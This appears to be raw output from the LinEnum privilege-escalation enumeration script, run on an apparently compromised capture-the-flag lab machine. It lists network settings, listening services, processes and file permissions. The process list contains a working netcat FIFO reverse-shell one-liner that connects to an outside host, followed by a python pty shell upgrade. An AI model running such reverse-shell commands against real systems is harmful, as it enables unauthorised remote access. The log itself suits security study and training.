          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:256 errors:0 dropped:0 overruns:0 frame:0
          TX packets:256 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:21344 (21.3 KB)  TX bytes:21344 (21.3 KB)

[-] ARP history:
? (10.10.10.2) at 00:50:56:b9:48:25 [ether] on ens192

[-] Nameserver(s):
nameserver 10.10.10.2

[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens192

[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.5 119592  5868 ?        Ss   05:58   0:02 /sbin/init
root          2  0.0  0.0      0     0 ?        S    05:58   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S    05:58   0:00 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<   05:58   0:00 [kworker/0:0H]
root          7  0.0  0.0      0     0 ?        S    05:58   0:00 [rcu_sched]
root          8  0.0  0.0      0     0 ?        S    05:58   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S    05:58   0:00 [migration/0]
root         10  0.0  0.0      0     0 ?        S    05:58   0:00 [watchdog/0]
root         11  0.0  0.0      0     0 ?        S    05:58   0:00 [kdevtmpfs]
root         12  0.0  0.0      0     0 ?        S<   05:58   0:00 [netns]
root         13  0.0  0.0      0     0 ?        S<   05:58   0:00 [perf]
root         14  0.0  0.0      0     0 ?        S    05:58   0:00 [khungtaskd]
root         15  0.0  0.0      0     0 ?        S<   05:58   0:00 [writeback]
root         16  0.0  0.0      0     0 ?        SN   05:58   0:00 [ksmd]
root         17  0.0  0.0      0     0 ?        SN   05:58   0:00 [khugepaged]
root         18  0.0  0.0      0     0 ?        S<   05:58   0:00 [crypto]
root         19  0.0  0.0      0     0 ?        S<   05:58   0:00 [kintegrityd]
root         20  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         21  0.0  0.0      0     0 ?        S<   05:58   0:00 [kblockd]
root         22  0.0  0.0      0     0 ?        S<   05:58   0:00 [ata_sff]
root         23  0.0  0.0      0     0 ?        S<   05:58   0:00 [md]
root         24  0.0  0.0      0     0 ?        S<   05:58   0:00 [devfreq_wq]
root         28  0.0  0.0      0     0 ?        S    05:58   0:00 [kswapd0]
root         29  0.0  0.0      0     0 ?        S<   05:58   0:00 [vmstat]
root         30  0.0  0.0      0     0 ?        S    05:58   0:00 [fsnotify_mark]
root         31  0.0  0.0      0     0 ?        S    05:58   0:00 [ecryptfs-kthrea]
root         47  0.0  0.0      0     0 ?        S<   05:58   0:00 [kthrotld]
root         48  0.0  0.0      0     0 ?        S<   05:58   0:00 [acpi_thermal_pm]
root         49  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         50  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         51  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         52  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         53  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         54  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         55  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         56  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root         57  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_0]
root         58  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_0]
root         59  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_1]
root         60  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_1]
root         67  0.0  0.0      0     0 ?        S<   05:58   0:00 [ipv6_addrconf]
root         80  0.0  0.0      0     0 ?        S<   05:58   0:00 [deferwq]
root         81  0.0  0.0      0     0 ?        S<   05:58   0:00 [charger_manager]
root        151  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_2]
root        152  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_2]
root        153  0.0  0.0      0     0 ?        S<   05:58   0:00 [vmw_pvscsi_wq_2]
root        154  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root        156  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_3]
root        161  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_3]
root        164  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_4]
root        166  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_4]
root        169  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_5]
root        173  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_5]
root        175  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_6]
root        177  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_6]
root        178  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_7]
root        179  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_7]
root        180  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_8]
root        181  0.0  0.0      0     0 ?        S<   05:58   0:00 [kpsmoused]
root        182  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_8]
root        183  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_9]
root        184  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_9]
root        185  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_10]
root        186  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_10]
root        187  0.0  0.0      0     0 ?        S<   05:58   0:00 [ttm_swap]
root        188  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_11]
root        189  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_11]
root        190  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_12]
root        191  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_12]
root        192  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_13]
root        193  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_13]
root        194  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_14]
root        195  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_14]
root        198  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_15]
root        203  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_15]
root        204  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_16]
root        206  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_16]
root        209  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_17]
root        211  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_17]
root        212  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_18]
root        213  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_18]
root        214  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_19]
root        216  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_19]
root        217  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_20]
root        219  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_20]
root        221  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_21]
root        224  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_21]
root        226  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_22]
root        228  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_22]
root        229  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_23]
root        231  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_23]
root        233  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_24]
root        236  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_24]
root        237  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_25]
root        239  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_25]
root        241  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_26]
root        243  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_26]
root        244  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_27]
root        246  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_27]
root        248  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_28]
root        250  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_28]
root        252  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_29]
root        254  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_29]
root        255  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_30]
root        256  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_30]
root        257  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_31]
root        258  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_31]
root        259  0.0  0.0      0     0 ?        S    05:58   0:00 [scsi_eh_32]
root        260  0.0  0.0      0     0 ?        S<   05:58   0:00 [scsi_tmf_32]
root        285  0.0  0.0      0     0 ?        S    05:58   0:00 [kworker/u256:28]
root        286  0.0  0.0      0     0 ?        S    05:58   0:00 [kworker/u256:29]
root        359  0.0  0.0      0     0 ?        S<   05:58   0:00 [raid5wq]
root        384  0.0  0.0      0     0 ?        S<   05:58   0:00 [kdmflush]
root        385  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root        395  0.0  0.0      0     0 ?        S<   05:58   0:00 [kdmflush]
root        396  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root        413  0.0  0.0      0     0 ?        S<   05:58   0:00 [bioset]
root        441  0.0  0.0      0     0 ?        S    05:58   0:00 [jbd2/dm-0-8]
root        442  0.0  0.0      0     0 ?        S<   05:58   0:00 [ext4-rsv-conver]
root        483  0.0  0.2  28336  2940 ?        Ss   05:58   0:00 /lib/systemd/systemd-journald
root        489  0.0  0.0      0     0 ?        S<   05:58   0:00 [kworker/0:1H]
root        504  0.0  0.0      0     0 ?        S<   05:58   0:00 [iscsi_eh]
root        508  0.0  0.0      0     0 ?        S    05:58   0:00 [kworker/0:4]
root        520  0.0  0.0      0     0 ?        S    05:58   0:00 [kauditd]
root        530  0.0  0.0      0     0 ?        S<   05:58   0:00 [ib_addr]
root        534  0.0  0.0      0     0 ?        S<   05:58   0:00 [ib_mcast]
root        536  0.0  0.0      0     0 ?        S<   05:58   0:00 [ib_nl_sa_wq]
root        538  0.0  0.0      0     0 ?        S<   05:58   0:00 [ib_cm]
root        540  0.0  0.1 102972  1688 ?        Ss   05:58   0:00 /sbin/lvmetad -f
root        543  0.0  0.0      0     0 ?        S<   05:58   0:00 [iw_cm_wq]
root        552  0.0  0.0      0     0 ?        S<   05:58   0:00 [rdma_cm]
root        556  0.0  0.4  44716  4180 ?        Ss   05:58   0:00 /lib/systemd/systemd-udevd
root        818  0.0  0.0      0     0 ?        S<   05:58   0:00 [ext4-rsv-conver]
systemd+    848  0.0  0.2 100324  2568 ?        Ssl  05:58   0:00 /lib/systemd/systemd-timesyncd
root        985  0.0  0.4 629660  3996 ?        Ssl  05:58   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root        986  0.0  0.6 275864  6288 ?        Ssl  05:58   0:00 /usr/lib/accountsservice/accounts-daemon
root        999  0.0  2.4 268684 24788 ?        Ssl  05:58   0:00 /usr/lib/snapd/snapd
syslog     1000  0.0  0.3 256396  3244 ?        Ssl  05:58   0:00 /usr/sbin/rsyslogd -n
root       1008  0.0  1.0 192244 10236 ?        Ssl  05:58   0:02 /usr/bin/vmtoolsd
root       1009  0.0  0.1  20104  1128 ?        Ss   05:58   0:00 /lib/systemd/systemd-logind
message+   1011  0.0  0.4  42944  4032 ?        Ss   05:58   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       1058  0.0  0.1   4400  1236 ?        Ss   05:58   0:00 /usr/sbin/acpid
root       1061  0.0  0.3  29012  3108 ?        Ss   05:58   0:00 /usr/sbin/cron -f
daemon     1064  0.0  0.2  26048  2268 ?        Ss   05:58   0:00 /usr/sbin/atd -f
root       1102  0.0  0.5 277092  5936 ?        Ssl  05:58   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1103  0.0  0.0  13376   164 ?        Ss   05:58   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       1218  0.0  0.6  65524  6216 ?        Ss   05:58   0:00 /usr/sbin/sshd -D
mysql      1239  0.0 15.9 1115980 159536 ?      Ssl  05:58   0:01 /usr/sbin/mysqld
root       1242  0.0  0.0   5224   156 ?        Ss   05:58   0:00 /sbin/iscsid
root       1243  0.0  0.3   5724  3516 ?        S<Ls 05:58   0:00 /sbin/iscsid
root       1328  0.0  0.1  15940  1836 tty1     Ss+  05:58   0:00 /sbin/agetty --noclear tty1 linux
root       1369  0.0  2.7 326204 27168 ?        Ss   05:58   0:00 /usr/sbin/apache2 -k start
nibbler    1717  0.0  2.0 330640 20400 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler    1718  0.0  2.0 330924 20652 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler    1719  0.0  1.8 330400 18916 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler    1722  0.0  1.9 330376 19456 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler    1726  0.0  1.9 330888 19488 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler   16496  0.0  1.8 330372 18104 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler   16497  0.0  1.9 330372 19456 ?        S    06:25   0:00 /usr/sbin/apache2 -k start
nibbler   16498  0.0  1.9 330876 19660 ?        S    06:26   0:00 /usr/sbin/apache2 -k start
nibbler   16499  0.0  1.8 330888 18704 ?        S    06:26   0:00 /usr/sbin/apache2 -k start
nibbler   16500  0.0  1.9 330796 19936 ?        S    06:26   0:00 /usr/sbin/apache2 -k start
root      16506  0.0  0.0      0     0 ?        S    06:39   0:00 [kworker/0:0]
nibbler   16562  0.0  0.0   4508   760 ?        S    06:39   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9443 >/tmp/f
nibbler   16565  0.0  0.0   4536   692 ?        S    06:39   0:00 cat /tmp/f
nibbler   16566  0.0  0.0   4508   760 ?        S    06:39   0:00 /bin/sh -i
nibbler   16567  0.0  0.1  11304  1836 ?        S    06:39   0:00 nc 10.10.14.3 9443
nibbler   16569  0.0  0.8  35832  8536 ?        S    06:41   0:00 python3 -c import pty; pty.spawn("/bin/bash")
nibbler   16570  0.0  0.3  18220  3304 pts/0    Ss   06:41   0:00 /bin/bash
nibbler   16589  0.0  0.3  19028  3932 pts/0    S+   06:51   0:00 /bin/bash ./LinEnum.sh
nibbler   16590  0.0  0.3  19072  3576 pts/0    S+   06:51   0:00 /bin/bash ./LinEnum.sh
nibbler   16591  0.0  0.0   4384   760 pts/0    S+   06:51   0:00 tee -a
nibbler   16804  0.0  0.2  19056  2888 pts/0    S+   06:52   0:00 /bin/bash ./LinEnum.sh
nibbler   16805  0.0  0.2  34428  2976 pts/0    R+   06:52   0:00 ps aux

[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1037528 May 16  2017 /bin/bash
lrwxrwxrwx 1 root root        4 Sep 22  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root   326224 Oct 27  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Oct 27  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Oct 27  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Oct 27  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Jun 14  2017 /sbin/agetty
lrwxrwxrwx 1 root root       20 Oct 27  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Jul 26  2017 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 Nov  8  2017 /sbin/mdadm
-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Nov  8  2017 /usr/bin/lxcfs
-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    15048 Jan 17  2016 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 21178072 Nov 30  2017 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    48112 Apr  8  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root   662496 Sep 18  2017 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root 24803912 Oct 18  2017 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   799216 Mar 16  2017 /usr/sbin/sshd

[-] /etc/init.d/ binary permissions:
total 324
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root 1183 Dec 28  2017 .depend.boot
-rw-r--r--  1 root root 1065 Dec 28  2017 .depend.start
-rw-r--r--  1 root root 1209 Dec 28  2017 .depend.stop
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 2802 Nov 17  2017 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup.dpkg-bak
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2378 Nov  8  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Jun 30  2016 lxd
-rwxr-xr-x  1 root root 2365 Oct  9  2017 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 5607 Feb  3  2017 mysql
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Mar 29  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Apr 27  2016 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 May 26  2016 uuidd

[-] /etc/init/ config file permissions:
total 156
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Mar 24  2021 ..
-rw-r--r--  1 root root  338 Apr  8  2016 acpid.conf
-rw-r--r--  1 root root 3709 Mar  3  2017 apparmor.conf
-rw-r--r--  1 root root 1629 Nov 17  2017 apport.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--  1 root root  412 Mar 28  2015 cryptdisks-udev.conf
-rw-r--r--  1 root root 1519 Mar 28  2015 cryptdisks.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root  540 Jun 29  2016 lxcfs.conf
-rw-r--r--  1 root root  813 Jun 30  2016 lxd.conf
-rw-r--r--  1 root root 1757 Feb  3  2017 mysql.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  641 Apr 27  2016 ssh.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf

[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 27 root root  36K Dec 28  2017 system
drwxr-xr-x  2 root root 4.0K Dec 28  2017 system-shutdown
drwxr-xr-x  2 root root 4.0K Dec 28  2017 network
drwxr-xr-x  2 root root 4.0K Dec 28  2017 system-generators
drwxr-xr-x  2 root root 4.0K Dec 28  2017 system-preset
-rwxr-xr-x  1 root root 443K Oct 27  2017 systemd-udevd
-rwxr-xr-x  1 root root  55K Oct 27  2017 systemd-activate
-rwxr-xr-x  1 root root 103K Oct 27  2017 systemd-bootchart
-rwxr-xr-x  1 root root 268K Oct 27  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-initctl
-rwxr-xr-x  1 root root 340K Oct 27  2017 systemd-localed
-rwxr-xr-x  1 root root 123K Oct 27  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-quotacheck
-rwxr-xr-x  1 root root 653K Oct 27  2017 systemd-resolved
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-rfkill
-rwxr-xr-x  1 root root 143K Oct 27  2017 systemd-shutdown
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-sysctl
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-backlight
-rwxr-xr-x  1 root root  47K Oct 27  2017 systemd-binfmt
-rwxr-xr-x  1 root root 301K Oct 27  2017 systemd-fsck
-rwxr-xr-x  1 root root  75K Oct 27  2017 systemd-fsckd
-rwxr-xr-x  1 root root 605K Oct 27  2017 systemd-logind
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-modules-load
-rwxr-xr-x  1 root root  35K Oct 27  2017 systemd-random-seed
-rwxr-xr-x  1 root root  51K Oct 27  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-reply-password
-rwxr-xr-x  1 root root  71K Oct 27  2017 systemd-sleep
-rwxr-xr-x  1 root root 333K Oct 27  2017 systemd-timedated
-rwxr-xr-x  1 root root 139K Oct 27  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 276K Oct 27  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 1.6M Oct 27  2017 systemd
-rwxr-xr-x  1 root root  15K Oct 27  2017 systemd-ac-power
-rwxr-xr-x  1 root root 352K Oct 27  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root  91K Oct 27  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root  31K Oct 27  2017 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Oct 27  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Oct 27  2017 systemd-journald
-rwxr-xr-x  1 root root 828K Oct 27  2017 systemd-networkd
-rwxr-xr-x  1 root root 1.3K Oct 26  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Sep 22  2017 system-sleep

/lib/systemd/system:
total 956K
drwxr-xr-x 2 root root 4.0K Dec 28  2017 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 getty.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 timers.target.wants
drwxr-xr-x 2 root root 4.0K Dec 28  2017 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Dec 28  2017 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Dec 28  2017 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Dec 10  2017 apache2.service.d
-rw-r--r-- 1 root root  683 Dec  7  2017 lxd.service
